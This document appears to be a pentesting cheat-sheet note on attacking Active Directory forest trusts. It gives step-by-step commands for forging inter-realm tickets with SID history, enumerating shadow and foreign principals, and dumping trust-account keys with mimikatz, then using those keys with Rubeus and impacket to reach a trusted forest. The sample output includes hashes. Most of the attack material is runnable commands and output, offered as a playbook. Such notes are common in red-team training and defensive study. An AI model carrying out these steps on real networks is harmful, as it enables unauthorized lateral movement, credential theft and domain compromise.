---
title: Forest Trust Hopping
tags:
  - foresttrust
  - activedirectory
enableToc: "true"
---
### SID History
This attack path is only applicable when **SID Filtering is disabled** and **SID History is enabled**. You can read the in-depth [blogpost](https://harmj0y.medium.com/a-guide-to-attacking-domain-trusts-ef5f8992bb9d) on this by harmj0y.

1. Check for `trustAttributes`  attribute. Make sure SID History is enabled

```powershell
Get-DomainTrust
[[..snip..]]
TrustAttributes : TREAT_AS_EXTERNAL
[[..snip..]]
```

If _TREAT\_AS\_EXTERNAL_ flag is set in **trustAtrributes** property, that means forst-trust is now more relaxed as stated in this [documentation](https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-adts/e9a2d23c-c31e-4a6f-88a0-6646fdb51a3c?redirectedfrom=MSDN)

> _If this bit is set, then a cross-forest trust to a domain is to be treated as an external trust for the purposes of SID Filtering._ **_Cross-forest trusts are more stringently filtered than external trusts_**_. This attribute relaxes those cross-forest trusts to be equivalent to external trusts._

2. Forge Inter-Realm TGT with extra sids. We injected sid of trusted domain users with RID > 1000. This is because most _WELL-KNOWN-SID_ is flag as _ForestSpecific_ based on the [documentation](https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-pac/55fc19f2-55ba-4251-8a6a-103dd7c66280) 

>The ForestSpecific rule is for those SIDs that are never allowed in a PAC that originates from out of the forest or from a domain that has been marked as QuarantinedWithinForest, unless it belongs to that domain.

```css
mimikatz# kerberos::golden /user:administrator /domain:contoso.local /sid:<domain-sid> /rc4:<trust-key> /service:krbtgt /target:fortress.local /sids:<victim-user-sid> /ticket:<path>\ticket.kirbi
```

3. Asktgs with the generated kirbi ticket

```powershell
Rubeus.exe asktgs /ticket:<path>\ticket.kirbi /service:HTTP/dc02.contose.local /dc:dc02.contoso.local /ptt
```

### Shadow Principal/PAM Trust
The users in current forest can be "mapped" to privileged group like Domain Admins and Enterprise Admins. Use below command to enumerate _Shadow Principal_

```powershell
Get-ADObject -Filter * -SearchBase ("CN=Shadow Principal Configuration,CN=Services," + (Get-ADRootDSE).configurationNamingContext) | select Name,member,msDS-ShadowPrincipalSid | fl
```

* `name` = Name of the shadow security principal
* `member` = member of group/user in the bastion domain
* `msds-ShadowPrincipalSid` = The SID for production domain group/user

### Foreign Principal
Foreign principal means other user(s) from trusted domain that have access to current domain resources
```powershell
# Get foreign user principals
Find-ForeignUser

# Get foreign group principals
Find-ForeignGroup
```

### Trust Account

>[!note]
>Note that this is not an exploit that could be escalated directly to higher privileged user. This is intend to give you a authenticated user access on another forest

Trust Account is created upon trust initiation (domain/trust) and it appears to be a member of Domain Users. Trust accounts will hold the same password/key on both domain/forest which we can use to move laterally from forest-to-forest.

1. Get the trust account hash. This can either be obtained through [DCSync](#dcsync) or the following command to dump trust keys

```css
mimikatz# lsadump::trust /patch 
[[..snip..]]
[ Out ] KIWI.LOCAL -> RANGE.NET
    * 6/29/2022 1:05:07 PM - CLEAR   - 5e 88 f5 8e bf 01 83 8f 61 39 50 37 77 d8 ce 86 b0 90 f8 e4 b5 2e ef e2 03 dd bf 4c
        * aes256_hmac       a3edf4ac6cb5ed1583434348a67454d66e9fcd25d97c3e930c24790dbfa1d15f
        * aes128_hmac       6e362139cacfdd8956d986fc8e33f0e9
        * rc4_hmac_nt       4cc0dd338664b4208fa6a1a4a7bee224
[[..snip..]]
```

2. Request TGT for the trust account by using the key dumped (aes/rc4). _Note: this wouldn't work over NTLM authentication, only kerberos_

```powershell
# rubeus
Rubeus.exe asktgt /user:RANGE$ /rc4:4cc0dd338664b4208fa6a1a4a7bee224 /domain:kiwi.local /dc:kiwi-dc.kiwi.local /nowrap

# impacket
getTGT.py kiwi.local/range\$ -hashes :4cc0dd338664b4208fa6a1a4a7bee224 -dc-ip 192.168.86.189
```

3. Now you should be able to use the retrieved TGT to interact with the trusted forest.